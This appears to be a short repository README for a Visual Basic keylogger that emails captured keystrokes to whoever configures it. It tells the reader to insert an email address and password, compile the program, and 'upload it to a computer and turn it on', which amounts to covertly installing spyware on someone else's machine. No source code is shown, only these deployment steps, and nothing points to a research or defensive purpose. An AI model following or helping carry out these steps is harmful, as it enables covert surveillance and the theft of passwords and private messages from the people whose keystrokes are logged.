Email-sending-keylogger
=======================

a keylogger that sends the logged keys to your email

to use it download the source code. edit the file change the ** to your email and the // to your email password
then compile it in visual basic and then upload it to a computer and turn it on

